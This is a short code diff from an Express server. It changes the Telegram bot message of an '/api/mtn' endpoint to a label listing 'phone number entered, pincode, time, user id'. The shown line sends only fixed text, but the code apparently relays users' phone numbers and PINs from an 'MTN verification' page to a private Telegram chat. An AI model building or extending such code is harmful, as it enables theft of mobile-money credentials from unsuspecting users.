@@ -35,7 +35,7 @@ app.post("/api/mtn", async (req, res) => {
       },
       body: JSON.stringify({
         chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: "🧪 Mtn verification completed successfully."
+        text: "Phone number eneterd,pincode,time,user id,Bot."
       })
     });
 
